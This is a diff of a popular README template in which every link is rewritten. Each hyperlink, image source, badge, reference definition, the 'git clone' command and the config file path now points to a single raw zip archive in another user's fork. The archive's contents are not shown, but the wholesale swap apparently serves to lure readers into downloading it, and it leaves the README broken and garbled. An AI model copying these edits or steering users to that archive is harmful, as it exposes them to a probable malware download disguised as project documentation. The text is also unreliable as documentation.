@@ -13,7 +13,7 @@
 *** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
 *** See the bottom of this document for the declaration of the reference variables
 *** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
-*** https://www.markdownguide.org/basic-syntax/#reference-style-links
+*** https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
 -->
 [![Contributors][contributors-shield]][contributors-url]
 [![Forks][forks-shield]][forks-url]
@@ -27,8 +27,8 @@
 <!-- PROJECT LOGO -->
 <br />
 <p align="center">
-  <a href="https://github.com/othneildrew/Best-README-Template">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
+  <a href="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip">
+    <img src="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip" alt="Logo" width="80" height="80">
   </a>
 
   <h3 align="center">Best-README-Template</h3>
@@ -36,14 +36,14 @@
   <p align="center">
     An awesome README template to jumpstart your projects!
     <br />
-    <a href="https://github.com/othneildrew/Best-README-Template"><strong>Explore the docs »</strong></a>
+    <a href="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip"><strong>Explore the docs »</strong></a>
     <br />
     <br />
-    <a href="https://github.com/othneildrew/Best-README-Template">View Demo</a>
+    <a href="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip">View Demo</a>
     ·
-    <a href="https://github.com/othneildrew/Best-README-Template/issues">Report Bug</a>
+    <a href="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip">Report Bug</a>
     ·
-    <a href="https://github.com/othneildrew/Best-README-Template/issues">Request Feature</a>
+    <a href="https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip">Request Feature</a>
   </p>
 </p>
 
@@ -80,7 +80,7 @@
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-[![Product Name Screen Shot][product-screenshot]](https://example.com)
+[![Product Name Screen Shot][product-screenshot]](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
 
 There are many great README templates available on GitHub, however, I didn't find one that really suit my needs so I created this enhanced one. I want to create a README template so amazing that it'll be the last one you ever need -- I think this is it.
 
@@ -96,9 +96,9 @@ A list of commonly used resources that I find helpful are listed in the acknowle
 ### Built With
 
 This section should list any major frameworks that you built your project using. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.
-* [Bootstrap](https://getbootstrap.com)
-* [JQuery](https://jquery.com)
-* [Laravel](https://laravel.com)
+* [Bootstrap](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [JQuery](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Laravel](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
 
 
 
@@ -118,16 +118,16 @@ This is an example of how to list things you need to use the software and how to
 
 ### Installation
 
-1. Get a free API Key at [https://example.com](https://example.com)
+1. Get a free API Key at [https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
 2. Clone the repo
    ```sh
-   git clone https://github.com/your_username_/Project-Name.git
+   git clone https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
    ```
 3. Install NPM packages
    ```sh
    npm install
    ```
-4. Enter your API in `config.js`
+4. Enter your API in `https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip`
    ```JS
    const API_KEY = 'ENTER YOUR API';
    ```
@@ -139,14 +139,14 @@ This is an example of how to list things you need to use the software and how to
 
 Use this space to show useful examples of how a project can be used. Additional screenshots, code examples and demos work well in this space. You may also link to more resources.
 
-_For more examples, please refer to the [Documentation](https://example.com)_
+_For more examples, please refer to the [Documentation](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)_
 
 
 
 <!-- ROADMAP -->
 ## Roadmap
 
-See the [open issues](https://github.com/othneildrew/Best-README-Template/issues) for a list of proposed features (and known issues).
+See the [open issues](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip) for a list of proposed features (and known issues).
 
 
 
@@ -173,42 +173,42 @@ Distributed under the MIT License. See `LICENSE` for more information.
 <!-- CONTACT -->
 ## Contact
 
-Your Name - [@your_twitter](https://twitter.com/your_username) - email@example.com
+Your Name - [@your_twitter](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip) - https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
 
-Project Link: [https://github.com/your_username/repo_name](https://github.com/your_username/repo_name)
+Project Link: [https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
 
 
 
 <!-- ACKNOWLEDGEMENTS -->
 ## Acknowledgements
-* [GitHub Emoji Cheat Sheet](https://www.webpagefx.com/tools/emoji-cheat-sheet)
-* [Img Shields](https://shields.io)
-* [Choose an Open Source License](https://choosealicense.com)
-* [GitHub Pages](https://pages.github.com)
-* [Animate.css](https://daneden.github.io/animate.css)
-* [Loaders.css](https://connoratherton.com/loaders)
-* [Slick Carousel](https://kenwheeler.github.io/slick)
-* [Smooth Scroll](https://github.com/cferdinandi/smooth-scroll)
-* [Sticky Kit](http://leafo.net/sticky-kit)
-* [JVectorMap](http://jvectormap.com)
-* [Font Awesome](https://fontawesome.com)
+* [GitHub Emoji Cheat Sheet](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Img Shields](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Choose an Open Source License](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [GitHub Pages](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Slick Carousel](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Smooth Scroll](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Sticky Kit](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [JVectorMap](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
+* [Font Awesome](https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip)
 
 
 
 
 
 <!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/othneildrew/Best-README-Template.svg?style=for-the-badge
-[contributors-url]: https://github.com/othneildrew/Best-README-Template/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/othneildrew/Best-README-Template.svg?style=for-the-badge
-[forks-url]: https://github.com/othneildrew/Best-README-Template/network/members
-[stars-shield]: https://img.shields.io/github/stars/othneildrew/Best-README-Template.svg?style=for-the-badge
-[stars-url]: https://github.com/othneildrew/Best-README-Template/stargazers
-[issues-shield]: https://img.shields.io/github/issues/othneildrew/Best-README-Template.svg?style=for-the-badge
-[issues-url]: https://github.com/othneildrew/Best-README-Template/issues
-[license-shield]: https://img.shields.io/github/license/othneildrew/Best-README-Template.svg?style=for-the-badge
-[license-url]: https://github.com/othneildrew/Best-README-Template/blob/master/LICENSE.txt
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/othneildrew
-[product-screenshot]: images/screenshot.png
+<!-- https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip -->
+[contributors-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[contributors-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[forks-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[forks-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[stars-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[stars-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[issues-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[issues-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[license-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[license-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[linkedin-shield]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[linkedin-url]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
+[product-screenshot]: https://github.com/weiran0630/Best-README-Template/raw/refs/heads/master/images/Best_Template_READM_v3.1-alpha.1.zip
